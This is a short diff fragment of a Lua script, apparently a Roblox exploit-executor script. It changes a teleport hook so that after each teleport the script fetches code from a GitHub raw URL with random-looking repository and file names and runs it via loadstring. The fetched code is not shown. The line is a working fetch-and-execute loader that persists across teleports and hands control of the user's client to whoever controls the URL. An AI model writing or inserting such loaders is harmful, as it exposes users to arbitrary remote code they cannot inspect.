@@ -217,7 +217,7 @@ else
 end
 
 game.Players.LocalPlayer.OnTeleport:Connect(function(State)
-    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Proxo123/Report/refs/heads/main/Report'))()")
+    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Crystal-Softworks/jcghvkjbl/refs/heads/main/hrgetagrtj'))()")
 end)
 
 task.delay(7, function()
